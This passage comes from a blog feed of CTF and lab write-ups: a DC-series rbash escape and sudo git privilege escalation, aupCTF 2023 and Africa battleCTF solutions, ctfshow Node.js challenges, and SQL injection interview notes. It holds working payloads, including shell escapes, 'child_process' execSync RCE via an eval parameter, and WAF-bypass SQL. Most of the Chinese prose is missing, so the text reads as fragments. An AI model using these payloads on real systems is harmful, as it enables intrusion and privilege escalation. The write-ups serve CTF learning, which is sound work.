class="headerlink" title="cewl"></a>cewl</h3><p>cewl custom wordlist</p><p>cewl  Custom Word List generatorRuby</p><p></p><p>cewl <br><code>cewl url -w </code><br><a href="https://www.freebuf.com/articles/network/190128.html">Kali LinuxCewl</a></p><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><p>tomjerry</p><h3 id="rbash-"><a href="#rbash-" class="headerlink" title="rbash()"></a>rbash()</h3><p>rbashbashbash<br>rbash</p><blockquote><p>cd<br>SHELL, PATH, ENV, or BASH_ENV<br>&#x2F;<br> - <br>&gt;, &gt;&gt;, &gt; |, &lt;&gt; &gt;&amp;,&amp;&gt;</p></blockquote><p><br>rbashvivishell<br>vi</p><blockquote><p>vi</p><p>Esc<br>:set shell&#x3D;&#x2F;bin&#x2F;bash</p></blockquote><p>shell </p><blockquote><p>:shell</p><p>shell<br>vi<br><code>export PATH=$PATH:/bin/</code><br> &#x2F;bin&#x2F;  PATH <br> PATH  PATH <br>export PATH&#x3D;$PATH:&#x2F;bin&#x2F; <br>$PATH  PATH  PATH <br>&#x2F;bin&#x2F;  PATH <br> &#x2F;bin&#x2F;  PATH  &#x2F;bin&#x2F;  PATH  &#x2F;bin&#x2F; <br> &#x2F;bin&#x2F;  export  PATH .bashrc  .bash_profile</p></blockquote><p><code>export PATH=$PATH:/usr/bin/</code></p><blockquote><p> &#x2F;usr&#x2F;bin&#x2F;  PATH <br> PATH  PATH <br>export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin&#x2F; <br>$PATH  PATH  PATH <br>&#x2F;usr&#x2F;bin&#x2F;  PATH <br> &#x2F;usr&#x2F;bin&#x2F;  PATH  &#x2F;usr&#x2F;bin&#x2F;  PATH  &#x2F;usr&#x2F;bin&#x2F; <br> &#x2F;usr&#x2F;bin&#x2F;  export  PATH .bashrc  .bash_profile</p></blockquote><h3 id="BASH-CMDSshell"><a href="#BASH-CMDSshell" class="headerlink" title="BASH_CMDSshell"></a>BASH_CMDSshell</h3><p>BASH_CMDS  Bash associative array Bash  Bash  BASH_CMDS BASH_CMDS </p><p><code>BASH_CMDS[x]=/bin/bash</code>BASH_CMDSx&#x2F;bin&#x2F;bash<strong>a</strong>**&#x2F;bin&#x2F;bash**<br>rbash()<br><img src="https://img-blog.csdnimg.cn/f1b84162e4bd44f3af7d24217ca12ca0.png" alt="2"></p><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p><strong>rbash</strong>flagjerryjerryjerryflaggit<br>git<code>sudo -l</code><br><img src="https://img-blog.csdnimg.cn/151e0426bdce4e17b9045110b9e3dc0d.png" alt="1"><br><strong></strong></p><blockquote><p>sudo git help config</p></blockquote><p></p><blockquote><p>!&#x2F;bin&#x2F;bash  (bashsh)</p></blockquote><p><strong></strong></p><blockquote><p>sudo git -p help</p></blockquote><p></p><blockquote><p>!&#x2F;bin&#x2F;bash  (bashsh)</p></blockquote><p>root</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p></p><blockquote><p>echo $PATH<br>**&#x2F;home&#x2F;jerry&#x2F;bin**<code>echo /home/jerry/bin/*</code></p></blockquote><p></p><blockquote><p>export PATH&#x3D;$PATH:<br>&#x2F;usr&#x2F;bin&#x2F;bin&#x2F;</p></blockquote>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>aupCTF 2023</title>
      <link href="/2023/06/26/aupCTF-2023/"/>
      <url>/2023/06/26/aupCTF-2023/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Ancient-Cipher"><a href="#Ancient-Cipher" class="headerlink" title="Ancient Cipher"></a>Ancient Cipher</h3><p><img src="https://img-blog.csdnimg.cn/5df595f659f94c7ab5d801f037dc2a2d.png" alt="1"><br>flag17<br><img src="https://img-blog.csdnimg.cn/ba3e1de862294304a5b0ef7baddfaf6b.png" alt="2"></p><h3 id="Enigma"><a href="#Enigma" class="headerlink" title="Enigma"></a>Enigma</h3><p><img src="https://img-blog.csdnimg.cn/0f0569b9766b44a786367768f6b9e46e.png" alt="3"><br><a href="https://www.dcode.fr/chiffre-machine-enigma">dcode.fr</a><br><img src="https://img-blog.csdnimg.cn/e8e5f10487bf4d5b9c058283305c173b.png" alt="3">flag</p><h3 id="Swiss-Army-Knife"><a href="#Swiss-Army-Knife" class="headerlink" title="Swiss Army Knife"></a>Swiss Army Knife</h3><p>XY<br><img src="https://img-blog.csdnimg.cn/5c8faeb486e642c7bb99a4da46ec88f0.png" alt="1">01X0Y1<br><code>01001100 01010011 00110000 01110100 01001001 01000011 00110100 01110100 01001100 01101001 01000001 01110100 01001100 01101001 00110100 01110100 01001001 01000011 00110000 01110100 01001100 01101001 01000001 01110101 01001100 01101001 00110100 01100111 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110101 01001100 01101001 00110100 01100111 01001100 01010011 00110100 01100111 01001100 01101001 00110000 01110101 01001100 01101001 01000001 01110101 01001100 01101001 00110000 01110101 01001001 01000011 00110100 01110101 01001100 01101001 00110100 01110101 01001001 01000011 00110100 01110100 01001100 01010011 01000001 01110100 01001100 01010011 01000001 01110101 01001100 01101001 00110100 01110100 01001100 01010011 01000001 01110101 01001100 01010011 00110100 01100111 01001100 01101001 00110000 01110101 01001001 01000011 00110000 01110101 01001001 01000011 00110100 01110101 01001100 01101001 00110000 01100111 01001100 01101001 00110000 01110101 01001001 01000011 00110000 01110100 01001100 01101001 01000001 01110101 01001100 01101001 00110100 01100111 01001100 01010011 00110000 01100111 01001100 01101001 00110000 01110100 01001100 01010011 01000001 01110100 01001001 01000011 00110100 01110101 01001100 01010011 00110100 01100111 01001100 01101001 00110100 01110100 01001001 01000011 00110000 01110100 01001100 01101001 00110100 01100111 01001100 01101001 00110000 01110100 01001001 01000011 00110000 01110100 01001100 01010011 01000001 01110101 01001100 01101001 00110100 01110101 01001100 01101001 01000001 01110101 01001100 01010011 00110100 01100111 01001100 01010011 00110000 01110101 01001100 01010011 01000001 01110100 01001100 01010011 00110000 01100111 01001100 01101001 00110100 01110101 01001100 01101001 00110000 01100111 01001100 01010011 00110100 01110100 01001100 01010011 01000001 01110101 01001100 01010011 00110000 01100111 01001100 01010011 00110000 01110100 01001001 01000011 00110000 01110101 01001100 01101001 00110100 01110101 01001001 01000011 00110100 01110100 01001100 01101001 01000001 01110101 01001100 01101001 00110100 01110100 01001001 01000011 00110100 01110101 01001100 01010011 00110100 01100111 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110100 01001001 01000011 00110000 01110101 01001100 01101001 01000001 01110100 01001100 01101001 00110000 01100111 01001100 01010011 00110000 01100111 01001100 01101001 00110100 01110101 01001100 01010011 00110000 01100111 01001100 01010011 00110100 01110101 01001100 01010011 01000001 01110101 01001100 01010011 00110000 01110101 01001001 01000011 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010001 00111101 00111101</code><br>ascii<br><img src="https://img-blog.csdnimg.cn/5cd8d3aaff6c474eb06754a05281c615.png" alt="1">base64<br><img src="https://img-blog.csdnimg.cn/59f1604b00e046fab59fc63703de08cb.png" alt="1">base<br><img src="https://img-blog.csdnimg.cn/9840a4da1a1b450482459d1139feb27e.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/8ea27925a3a54fb6b5b99e177b2351c9.png" alt="1">key&#x3D;19flag<strong>aupCTF{mu1tip13-3nc0d1ng5-u53d}</strong></p><h3 id="Battistas-Bet"><a href="#Battistas-Bet" class="headerlink" title="Battistas Bet"></a>Battistas Bet</h3><p><strong>Giovan Battista Bellaso **<br><br><img src="https://img-blog.csdnimg.cn/9edf442d5cd04e6bb10dbff65252c89d.png" alt="1"><a href="https://www.dcode.fr/chiffre-autoclave"></a><br></strong>SECRET**<br><img src="https://img-blog.csdnimg.cn/d4ffb92d6b4c42fd9b8a0579ca441991.png" alt="2">flag<br><img src="https://img-blog.csdnimg.cn/9b847c749a684ba4a8d84d6f6d5ca062.png" alt="2"></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Starter"><a href="#Starter" class="headerlink" title="Starter"></a>Starter</h3><p><br><img src="https://img-blog.csdnimg.cn/d2498d0fc13b422cb81eec69d0c87a2f.png" alt="6">flag<strong>aupCTF{w45nt-th47-h4rd-r1gh7}</strong><br><img src="https://img-blog.csdnimg.cn/2af8c9822abb47fda91d26bd8b464b41.png" alt="7"></p><h3 id="SQLi-1"><a href="#SQLi-1" class="headerlink" title="SQLi - 1"></a>SQLi - 1</h3><p><img src="https://img-blog.csdnimg.cn/12c88ff0993c4feaaaa5b118f669d684.png" alt="7">flag<br><img src="https://img-blog.csdnimg.cn/e3d70cf1983240e3b7bc7e5b007b3329.png" alt="2"></p><h3 id="SQLi-2"><a href="#SQLi-2" class="headerlink" title="SQLi - 2"></a>SQLi - 2</h3><p>SQLi - 1</p><h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">headar_easy</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>META<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'HTTP_GETFLAG'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'yes'</span><span class="token punctuation">:</span>        context <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'flag'</span><span class="token punctuation">:</span> <span class="token string">'[REDACTED]'</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>                <span class="token keyword">return</span> render<span class="token punctuation">(</span>request<span class="token punctuation">,</span> <span class="token string">'aa/flag.html'</span><span class="token punctuation">,</span> context<span class="token punctuation">)</span>        <span class="token keyword">return</span> render<span class="token punctuation">(</span>request<span class="token punctuation">,</span> <span class="token string">'aa/index.html'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>headerGETFLAGyesflag<strong>aupCTF{cust0m-he4d3r-r3qu3st}</strong><br><img src="https://img-blog.csdnimg.cn/fb98935d0ddd4199911500d3d259d82c.png" alt="1"></p><h3 id="Directory"><a href="#Directory" class="headerlink" title="Directory"></a>Directory</h3><p><img src="https://img-blog.csdnimg.cn/0f027c28c6fe4a7eb1179daeaa99dbf0.png" alt="2"><br><br><img src="https://img-blog.csdnimg.cn/453d33679d7c4d86969f177b9a73147d.png" alt="3"><br><img src="https://img-blog.csdnimg.cn/6cdfe7300f214c7a8003a3312c65f3c2.png" alt="2"><br>page712flag<br><img src="https://img-blog.csdnimg.cn/552adc4ecd794ed982cb5681c503668d.png" alt="3"></p><h2 id="Stegnography"><a href="#Stegnography" class="headerlink" title="Stegnography"></a>Stegnography</h2><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>LSB<br><img src="https://img-blog.csdnimg.cn/2253e5d2e4b74e7fb2dd531267e47149.png" alt="6"><br>flag<strong>aupCTF{zst1g-1s-c00l_rig3ht}</strong></p><h3 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h3><p><br><strong>Stegsolve.jar</strong><br><br><img src="https://img-blog.csdnimg.cn/5d3f882cc578437d83836eff62d22738.png" alt="1"><br><br><img src="https://img-blog.csdnimg.cn/3dc9c71a6ece4deba4cd1dd49a996a8f.png" alt="2"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Fun"><a href="#Fun" class="headerlink" title="Fun"></a>Fun</h3><p>JSFUCK<br><img src="https://img-blog.csdnimg.cn/38a4f300723c41f48d5f83d2564b51cc.png" alt="1"><br>flag<br><img src="https://img-blog.csdnimg.cn/a31ef56efa794b0ab298c69e29f3ff6b.png" alt="1"><br><strong>aupCTF{j4v45c1pt_but_f*ck3d}</strong></p><h3 id="Sanity-check"><a href="#Sanity-check" class="headerlink" title="Sanity check"></a>Sanity check</h3><p><img src="https://img-blog.csdnimg.cn/f5113653227342e7b872c62864e5621d.png" alt="1">flag<br><img src="https://img-blog.csdnimg.cn/e26f24dd654b4460a14a9e1dcea4e2a5.png" alt="2"></p><h3 id="Frequency"><a href="#Frequency" class="headerlink" title="Frequency"></a>Frequency</h3><p><img src="https://img-blog.csdnimg.cn/cce4e02a75d24f24a43a7ac3a6ac9cfc.png" alt="1"><strong>DTMF</strong><a href="https://blog.csdn.net/qq_42939527/article/details/105201926">WUST-CTF2020girlfriend</a><br><strong>dtmf2num_2</strong><br><img src="https://img-blog.csdnimg.cn/5c1938e626414009aa94897eee698429.png" alt="3"><br>flag<strong>aupCTF{00923456060484}</strong></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Africa battle CTF 2023</title>
      <link href="/2023/06/24/Africa-battle-CTF-2023/"/>
      <url>/2023/06/24/Africa-battle-CTF-2023/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><br><img src="https://img1.imgtp.com/2023/06/24/1vay1LoH.png" alt="1"></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>web</p><h3 id="Civilization"><a href="#Civilization" class="headerlink" title="Civilization"></a>Civilization</h3><p><br><img src="https://img-blog.csdnimg.cn/1197576aa444402bbeccc85df9ccafcd.png" alt="2"><br><br>source</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ami'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ami'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$cigar</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'africacradlecivilization'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token variable">$cigar</span></span>/"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$input</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$cigar</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">africa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"home.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>oksourceami<strong>cigar</strong><strong>africacradlecivilization</strong><strong>cigar</strong><code>?source=&amp;ami=africacrafricacradlecivilizationadlecivilization</code>flag<br><img src="https://img-blog.csdnimg.cn/f267e5a536424c08971111a00c024839.png" alt="2"></p><h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="Thumb"><a href="#Thumb" class="headerlink" title="Thumb"></a>Thumb</h3><p><img src="https://img-blog.csdnimg.cn/0f847f4b10fe4d4bb16ec186df53b093.png" alt="3"></p><p><img src="https://img-blog.csdnimg.cn/edbed056a8ce45bbbcd0895bd8a43ce5.jpeg" alt="3"><br><img src="https://img-blog.csdnimg.cn/98b35979c0f1473c99e3d22abc891009.png" alt="5"><br>flag<br><img src="https://img-blog.csdnimg.cn/3f6b41a7f97f4c14a519c2f49c53fc3a.png" alt="6"></p><h3 id="Find-Me"><a href="#Find-Me" class="headerlink" title="Find Me"></a>Find Me</h3><p><br><img src="https://img-blog.csdnimg.cn/fc1e3addbbd644998d2bc407ce192e81.png" alt="7"><br>http<br><img src="https://img-blog.csdnimg.cn/75c6715314054dfa82d12a4cc6b877f5.png" alt="1"><br>POSTbase46<br><img src="https://img-blog.csdnimg.cn/db80329811b0440991c50c78e908797c.png" alt="1"><br>flag<code>battleCTF&#123;PApdsjRTae&#125;</code></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Back-To-Origin"><a href="#Back-To-Origin" class="headerlink" title="Back To Origin"></a>Back To Origin</h3><p><img src="https://img-blog.csdnimg.cn/ac05d62cc039487b89ae19d4e08314fe.png" alt="1"><br><a href="https://www.likefont.com/"></a></p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-nodejs</title>
      <link href="/2023/06/23/ctfshoow-nodejs/"/>
      <url>/2023/06/23/ctfshoow-nodejs/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="335"><a href="#335" class="headerlink" title="335"></a>335</h2><p>rce<br><strong>require(child_process).execSync(ls);</strong></p><h2 id="336"><a href="#336" class="headerlink" title="336"></a>336</h2><p><br><code>?eval=__filename</code>:<br><code>?eval=__dirname</code>:<br><img src="https://img-blog.csdnimg.cn/e9bed0e011fc43859dc646488a80f9bd.png" alt="1"><br><code>?eval=require(&#39;fs&#39;).readFileSync(&#39;/app/routes/index.js&#39;,&#39;utf-8&#39;)</code><br><img src="https://img-blog.csdnimg.cn/28c279fff781455bbb9b44b2c0556449.png" alt="2"><br><br><code>?eval=require(&#39;child_process&#39;)[&#39;exe&#39;+&#39;cSync&#39;](&#39;ls&#39;);</code>url<br><img src="https://img-blog.csdnimg.cn/d5576132fdeb4f0786bfb052d3b942c6.png" alt="3">flag<br><img src="https://img-blog.csdnimg.cn/e59fe23388254d009bdd149868b776ec.png" alt="4"></p><p>flag</p><h2 id="337"><a href="#337" class="headerlink" title="337"></a>337</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'xxxxxxx'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> a <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>a<span class="token punctuation">;</span>  <span class="token keyword">var</span> b <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>b<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'tql'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>?a[]=1&amp;b[]=1</code>flag<br><img src="https://img-blog.csdnimg.cn/03ad667c580b4a9d96f30777554c3985.png" alt="3"></p><h2 id="338"><a href="#338" class="headerlink" title="338"></a>338</h2><p>login.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span><span class="token string">'36dboy'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//***</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">''</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__"></a><br><img src="https://img-blog.csdnimg.cn/04baaf7cddac488a88409bfd74e1f5b4.png" alt="5"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hvv</title>
      <link href="/2023/06/20/hvv%E5%88%9D%E7%BA%A7%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/"/>
      <url>/2023/06/20/hvv%E5%88%9D%E7%BA%A7%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="OWASP-Top10"><a href="#OWASP-Top10" class="headerlink" title="OWASP Top10"></a>OWASP Top10</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">SQL</span><span class="token constant">XML</span><span class="token constant">XXE</span><span class="token constant">XSS</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>MySql3306</p><p>Oracle1521</p><p>Redis6379</p><p>Mssql1433    &#x2F;&#x2F;Microsoft SQL Server</p><p>PostgreSQL5432</p><p><strong></strong></p><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>SQL </p><p>union ,select sleep </p><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p><strong>SQL</strong></p><p>WAF</p><pre class="line-numbers language-none"><code class="language-none">UniOn AND 1 &#x3D; 2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SQL:</strong></p><p></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;**&#x2F;select user,password from &#x2F;**&#x2F;users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SQL</strong></p><p>URL</p><pre class="line-numbers language-none"><code class="language-none">URL%20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SQL</strong></p><p>whereusers</p><pre class="line-numbers language-none"><code class="language-none">select column_name from information_schema.tables where table_name&#x3D;&quot;users&quot;select column_name from information_schema.tables where table_name&#x3D;&quot;text&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SQL</strong></p><p></p><pre class="line-numbers language-none"><code class="language-none">usersselect column_name from information_schema.tables where table_name&#x3D;0x7573657273<span aria-hidden="true" 